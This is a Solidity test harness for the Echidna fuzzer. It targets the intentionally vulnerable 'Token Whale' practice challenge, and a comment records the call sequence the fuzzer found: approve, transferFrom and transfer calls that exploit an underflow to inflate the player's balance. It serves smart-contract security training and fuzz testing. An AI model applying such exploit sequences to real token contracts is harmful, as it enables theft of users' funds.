pragma solidity ^0.4.25;

import "./TokenWhaleChallenge.sol";

/// @dev Run the template with
///      ```
///      solc-select use 0.4.25
///      echidna contracts/Week6/TokenWhaleTest.sol --contract TestWhaleToken
///      ```
contract TestWhaleToken is TokenWhaleChallenge {
    address echidna = msg.sender;

    function TestWhaleToken() public TokenWhaleChallenge(echidna) {}

    function echidna_isCompleted() public view returns (bool) {
        /* This ERC20-compatible token is hard to acquire. There’s a fixed supply of 1,000 tokens, all of which are yours to start with.

            Find a way to accumulate at least 1,000,000 tokens to solve this challenge.
        */
        return balanceOf[player] <= 1000000;
        /* Solution:
         Call sequence:
            approve(0x20000,167133266616215219087984434971341992939411184825004473792248855581927478929) from: 0x0000000000000000000000000000000000030000 Time delay: 440097 seconds Block delay: 127
            transferFrom(0x30000,0xffffffff,671) from: 0x0000000000000000000000000000000000020000 Time delay: 355645 seconds Block delay: 32767
            transfer(0x10000,115792089237316195423570985008687907853269984665640564039457584007913129638936) from: 0x0000000000000000000000000000000000020000 Time delay: 297507 seconds Block delay: 22909
            transfer(0x30000,71834082248646112960033315906464535836812324211014610942410955687412905560741) from: 0x0000000000000000000000000000000000010000 Time delay: 358061 seconds Block delay: 33200

         */
    }
}
